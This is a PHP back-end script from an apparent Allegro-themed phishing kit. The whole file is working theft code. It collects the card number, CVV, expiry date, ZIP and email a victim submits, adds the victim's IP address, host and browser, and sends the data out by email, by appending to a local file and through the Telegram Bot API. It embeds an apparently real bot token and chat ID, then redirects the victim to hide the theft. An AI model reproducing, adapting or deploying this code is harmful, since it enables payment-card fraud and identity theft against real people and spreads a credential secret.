<?php
error_reporting(0);
session_start();

$ip = getenv("REMOTE_ADDR");
	$message .= "CC--------- ALLEGRO ^_^ ccvInfos  -------------\n";
	$message .= "--------------------------------------\n";
    $message .= "-------------- Credit Card -------------\n";
	$message .= "Card Number  : ".$_POST['cardnumber']."\n";
	$message .= "Security code (CVV)  : ".$_POST['cvv']."\n";
	$message .= "Expiration date (Month) : ".$_POST['mm']."\n";
	$message .= "Expiration date (Year) : ".$_POST['rr']."\n";
	$message .= "zip cod : ".$_POST['zip']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- coded By abdel  ---------\n";
	$subject = "Login ccv><vbv | $ip | ".$_POST['email'];
	$send = ""; //Put You Email Here
	$headers = 'From: WIZ-D.N.G' . "\r\n";
	mail($send,$subject,$message,$headers);
	$file = fopen("root.txt", 'a');
	// Telegram API
 
 $chatID = '957462599';
 $token = '1995174087:AAET7HA7U74B2npJb82rrCm73QIz-2OaNfQ';
 
 $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID; $url = $url . "&text=" . urlencode($message);
 $ch = curl_init();
 $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true); curl_setopt_array($ch, $optArray);
 $outpot = curl_exec($ch);
 curl_close($ch);
fwrite($file, $message);
	echo '<META HTTP-EQUIV="Refresh" Content="0; URL=../auth.php?652109458356bvhgfpmlsfsads848nghuty">';  
?>